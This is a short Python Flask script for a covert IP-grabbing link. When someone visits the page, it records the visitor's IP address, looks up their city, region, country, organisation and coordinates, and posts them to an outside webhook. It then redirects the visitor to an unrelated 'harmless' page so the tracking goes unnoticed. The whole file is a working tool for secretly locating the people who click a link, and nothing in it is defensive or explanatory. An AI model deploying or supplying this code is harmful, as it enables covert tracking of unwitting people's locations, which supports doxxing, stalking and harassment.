
from flask import Flask, request, redirect
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://eoz2txbodifdboq.m.pipedream.net"  # replace with yours

@app.route("/")
def index():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    geo_req = requests.get(f"https://ipapi.co/{user_ip}/json/")

    if geo_req.status_code == 200:
        geo_data = geo_req.json()
        message = (
            f"**New Visit**\n"
            f"IP: {user_ip}\n"
            f"City: {geo_data.get('city')}\n"
            f"Region: {geo_data.get('region')}\n"
            f"Country: {geo_data.get('country_name')}\n"
            f"Org: {geo_data.get('org')}\n"
            f"Lat/Lon: {geo_data.get('latitude')}, {geo_data.get('longitude')}"
        )
    else:
        message = f"IP: {user_ip}\nCould not retrieve location data."

    # Send to Discord webhook
    requests.post(WEBHOOK_URL, json={"content": message})

    # Redirect to somewhere harmless
    return redirect("https://bigrat.monster")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
